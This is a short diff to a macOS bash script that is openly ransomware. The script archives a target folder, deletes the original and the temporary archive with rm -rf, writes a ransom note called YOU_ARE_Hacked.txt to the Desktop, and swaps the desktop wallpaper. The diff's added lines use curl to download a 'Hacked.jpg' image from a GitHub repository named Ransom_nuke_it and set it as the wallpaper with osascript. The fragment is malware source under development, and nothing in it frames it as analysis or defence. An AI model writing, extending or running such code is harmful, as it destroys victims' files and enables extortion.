@@ -38,7 +38,7 @@ BASENAME="$(basename "$TARGET")"
 PARENT_DIR="$(dirname  "$TARGET")"
 ARCHIVE="${PARENT_DIR}/${BASENAME}.tar.gz"
 ENCRYPTED="${PARENT_DIR}/${BASENAME}.enc"
-README="${PARENT_DIR}/README_${BASENAME}.txt"
+README="$HOME/Desktop/YOU_ARE_Hacked.txt"
 
 # ---- 4. Create archive and encrypt ------------------------------------------
 echo "Archiving '$TARGET' → '$ARCHIVE' ..."
@@ -52,7 +52,8 @@ echo "   Removing original folder and temporary archive ..."
 rm -rf "$TARGET" "$ARCHIVE"
 
 # ---- 6. Drop ransom note and update wallpaper-----------------------------------------------------
-osascript -e 'tell application "System Events" to set picture of every desktop to "/tmp/Hacked.jpg"'
+curl -O https://raw.githubusercontent.com/sectorxatwork/Ransom_nuke_it/refs/heads/main/Hacked.jpg ~/Desktop/Hacked.jpg
+osascript -e 'tell application "System Events" to set picture of every desktop to "~/Desktop/Hacked.jpg"'
 
 
 cat > "$README" <<EOL
